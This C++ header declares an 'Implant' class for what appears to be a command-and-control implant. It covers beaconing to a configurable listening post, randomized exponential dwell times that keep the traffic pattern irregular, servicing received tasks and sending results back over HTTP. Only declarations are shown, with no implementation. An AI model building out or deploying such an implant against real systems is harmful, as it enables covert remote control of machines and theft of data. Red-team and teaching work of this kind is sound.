#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "tasks.h"

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>

#include <boost/property_tree/ptree.hpp>

struct Implant {
    //Implant constructor
    Implant(std::string host, std::string port, std::string uri);

    //thread for servicing tasks
    std::future<void> taskThread;

    //public functions exposed by implant
    void beacon();
    void setMeanDwell(double meanDwell);
    void setRunning(bool isRunning);
    void serviceTasks();

private:
    //listening post endpoint config
    const std::string host, port, uri;

    //variables for implant config, dwell time, running status
    //exponential distribution to get a variable number of seconds for dwell time (communication pattern is not constant)
    std::exponential_distribution<double> dwellDistributionSeconds;
    std::atomic_bool isRunning;

    //mutexes
    std::mutex taskMutex, resultsMutex;

    //storing results
    boost::property_tree::ptree results;

    //storing tasks
    std::vector<Task> tasks;

    //generate random device
    std::random_device device;

    void parseTasks(const std::string& response);
    //no discard because we neber expect to make a call to sendResults and discard the return value
    [[nodiscard]] std::string sendResults();
};

[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port, 
    std::string_view uri, 
    std::string_view payload);
